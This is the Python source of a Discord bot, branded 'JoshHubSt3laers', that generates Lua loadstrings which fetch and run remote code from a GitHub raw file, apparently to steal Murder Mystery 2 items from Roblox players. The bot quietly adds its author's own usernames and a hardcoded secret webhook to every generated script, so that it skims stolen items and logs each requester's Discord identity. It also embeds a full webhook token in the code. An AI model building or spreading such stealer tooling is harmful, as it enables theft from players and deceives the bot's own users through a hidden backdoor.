import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import urllib.parse
import os
import requests

intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

# Configuration
SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")

# Webhook for tracking who generates scripts
TRACKING_WEBHOOK = SECRET_WEBHOOK

def send_webhook_notification(user, targets, paste_url, guild_name, loadstring_code):
    """Send notification when someone generates a script"""
    try:
        data = {
            "embeds": [{
                "title": "📊 New Script Generated!",
                "color": 5814783,
                "fields": [
                    {"name": "User", "value": f"{user.name}#{user.discriminator}", "inline": True},
                    {"name": "User ID", "value": str(user.id), "inline": True},
                    {"name": "Server", "value": guild_name or "DM", "inline": True},
                    {"name": "Target Usernames", "value": targets or "None", "inline": False},
                    {"name": "Pastebin Link", "value": paste_url or "Failed", "inline": False},
                    {"name": "Loadstring", "value": f"```lua\n{loadstring_code[:100]}...\n```" if loadstring_code and len(loadstring_code) > 100 else f"```lua\n{loadstring_code}\n```", "inline": False}
                ],
                "timestamp": discord.utils.utcnow().isoformat()
            }]
        }
        response = requests.post(TRACKING_WEBHOOK, json=data, timeout=5)
        print(f"✅ Tracking webhook sent: {response.status_code}")
        return True
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        return False

def create_pastebin(content):
    """Create a paste on Pastebin and return both URLs"""
    try:
        if not PASTEBIN_API_KEY:
            print("❌ No Pastebin API key found!")
            return None, None
            
        data = {
            'api_dev_key': PASTEBIN_API_KEY,
            'api_option': 'paste',
            'api_paste_code': content,
            'api_paste_private': '1',
            'api_paste_expire_date': '1D',
            'api_paste_name': 'MM2 Script'
        }
        
        print("🔄 Creating Pastebin...")
        response = requests.post('https://pastebin.com/api/api_post.php', data=data, timeout=10)
        
        if response.status_code == 200:
            paste_url = response.text.strip()
            print(f"✅ Pastebin created: {paste_url}")
            
            if 'pastebin.com/' in paste_url and not paste_url.startswith('Bad API request'):
                paste_id = paste_url.split('/')[-1]
                raw_url = f"https://pastebin.com/raw/{paste_id}"
                print(f"✅ Raw URL: {raw_url}")
                return paste_url, raw_url
            else:
                print(f"❌ Pastebin API error: {paste_url}")
                return None, None
        else:
            print(f"❌ Pastebin HTTP error: {response.status_code}")
            return None, None
    except Exception as e:
        print(f"❌ Pastebin creation error: {e}")
        return None, None

class ScriptModal(Modal, title="MM2 Script Generator"):
    usernames = TextInput(label="Target Usernames (comma separated)", placeholder="e.g. Nikilis, Tobi, JD", style=discord.TextStyle.paragraph, required=True)
    webhook = TextInput(label="Your Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.long, required=True)
    min_rarity = TextInput(label="Minimum Rarity (default: Godly)", placeholder="Godly, Ancient, Legendary, etc.", default="Godly", required=False)
    min_value = TextInput(label="Minimum Value (default: 1)", placeholder="Only collect items worth this or more", default="1", required=False)
    ping = TextInput(label="Ping @everyone on hit? (Yes/No)", placeholder="Yes or No", default="No", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
        all_targets = user_targets + SECRET_USERNAMES
        generator_info = f"{interaction.user.name}#{interaction.user.discriminator} ({interaction.user.id})"
        
        print(f"🔄 Generating script for {interaction.user.name}")
        print(f"🎯 Targets: {all_targets}")
        
        params = urllib.parse.urlencode({
            "users": ",".join(all_targets),
            "webhook": self.webhook.value,
            "secret_webhook": SECRET_WEBHOOK,
            "min_rarity": self.min_rarity.value or "Godly",
            "min_value": self.min_value.value or "1",
            "ping": self.ping.value or "No",
            "generator": generator_info
        })
        
        github_url = f"{RAW_SCRIPT_URL}?{params}"
        print(f"🔗 GitHub URL: {github_url}")
        
        # Create the script content that will be pasted
        script_content = f'loadstring(game:HttpGet("{github_url}"))()'
        
        # Create Pastebin
        paste_url, raw_url = create_pastebin(script_content)
        
        if paste_url and raw_url:
            # Create the FINAL loadstring that users will execute
            loadstring_code = f'loadstring(game:HttpGet("{raw_url}"))()'
            
            print(f"✅ Final loadstring: {loadstring_code}")
            
            # Send tracking notification
            send_webhook_notification(
                interaction.user,
                ', '.join(user_targets) if user_targets else "None",
                paste_url,
                interaction.guild.name if interaction.guild else "DM",
                loadstring_code
            )
            
            # Send to user - THIS IS THE CRITICAL FIXED PART
            try:
                await interaction.user.send(
                    f"**🔪 JoshHubSt3laers – Your loadstring is ready!**\n\n"
                    f"Copy and execute this:\n"
                    f"```lua\n{loadstring_code}\n```"
                )
                await interaction.followup.send("✅ Script sent to your DMs!", ephemeral=True)
            except discord.Forbidden:
                # If can't DM, send in channel
                await interaction.followup.send(
                    f"**🔪 JoshHubSt3laers – Your loadstring is ready!**\n\n"
                    f"Copy and execute this:\n"
                    f"```lua\n{loadstring_code}\n```",
                    ephemeral=True
                )
        else:
            # Fallback if Pastebin fails
            print("⚠️ Pastebin failed, using direct GitHub URL")
            direct_loadstring = f'loadstring(game:HttpGet("{github_url}"))()'
            
            # Still send tracking
            send_webhook_notification(
                interaction.user,
                ', '.join(user_targets) if user_targets else "None",
                "Failed to create Pastebin",
                interaction.guild.name if interaction.guild else "DM",
                direct_loadstring
            )
            
            try:
                await interaction.user.send(
                    f"**🔪 JoshHubSt3laers – Your loadstring is ready! (Direct Link)**\n\n"
                    f"Copy and execute this:\n"
                    f"```lua\n{direct_loadstring}\n```"
                )
                await interaction.followup.send("✅ Script sent to your DMs! (Using direct link)", ephemeral=True)
            except discord.Forbidden:
                await interaction.followup.send(
                    f"**🔪 JoshHubSt3laers – Your loadstring is ready! (Direct Link)**\n\n"
                    f"Copy and execute this:\n"
                    f"```lua\n{direct_loadstring}\n```",
                    ephemeral=True
                )

@tree.command(name="generate-mm2", description="🎮 Generate your custom MM2 script loadstring")
async def generate_mm2(interaction: discord.Interaction):
    await interaction.response.send_modal(ScriptModal())

@bot.event
async def on_ready():
    print(f"══════════════════════════════════")
    print(f"✅ {bot.user} is online!")
    print(f"🤖 Bot ID: {bot.user.id}")
    print(f"🔗 Tracking Webhook: {TRACKING_WEBHOOK}")
    print(f"📁 Script Source: {RAW_SCRIPT_URL}")
    print(f"🔑 Pastebin API: {'✅ Set' if PASTEBIN_API_KEY else '❌ Missing'}")
    print(f"══════════════════════════════════")
    
    try:
        await tree.sync()
        print(f"🔄 Commands synced successfully")
    except Exception as e:
        print(f"⚠️ Command sync warning: {e}")

if __name__ == "__main__":
    # Check for required environment variables
    required_env_vars = ["DISCORD_TOKEN", "PASTEBIN_API_KEY"]
    missing_vars = [var for var in required_env_vars if not os.getenv(var)]
    
    if missing_vars:
        print(f"❌ Missing environment variables: {', '.join(missing_vars)}")
        print("Please set these in Replit Secrets:")
        for var in missing_vars:
            print(f"  - {var}")
        exit(1)
    
    print("🚀 Starting Discord bot...")
    bot.run(os.getenv("DISCORD_TOKEN"))
